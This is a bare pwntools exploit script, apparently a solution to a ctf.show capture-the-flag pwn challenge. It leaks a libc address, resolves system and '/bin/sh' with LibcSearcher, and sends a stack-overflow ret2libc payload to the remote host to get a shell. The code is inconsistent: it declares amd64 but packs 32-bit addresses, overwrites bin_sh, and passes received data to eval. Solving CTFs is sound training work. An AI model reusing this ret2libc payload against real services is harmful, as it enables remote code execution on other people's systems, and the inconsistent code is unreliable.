from pwn import *
from LibcSearcher import *

# 设置目标程序
context(arch='amd64', os='linux', log_level='debug')

# 本地调试或远程连接
# io = process('./vulnerable_binary')  # 本地
io = remote('pwn.challenge.ctf.show', 28266)  # 远程
elf =ELF('pwn6')
io.recvuntil("puts: ")

puts = eval(io.recvuntil('\n', drop=True))
bin_sh = 0x0804B028

libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
payload = cyclic(0x9C + 4) + p32(system) + p32(0) + p32(bin_sh)
io.sendline(payload)
io.recv()
io.interactive()